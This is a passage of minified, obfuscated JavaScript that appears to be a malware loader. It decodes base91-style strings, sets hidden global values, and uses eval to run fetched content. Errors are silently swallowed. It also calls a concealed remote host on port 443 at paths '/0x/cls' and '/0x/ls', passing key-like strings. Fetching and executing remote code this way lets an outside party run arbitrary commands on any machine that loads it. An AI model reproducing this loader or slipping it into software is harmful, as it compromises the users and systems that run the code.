q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
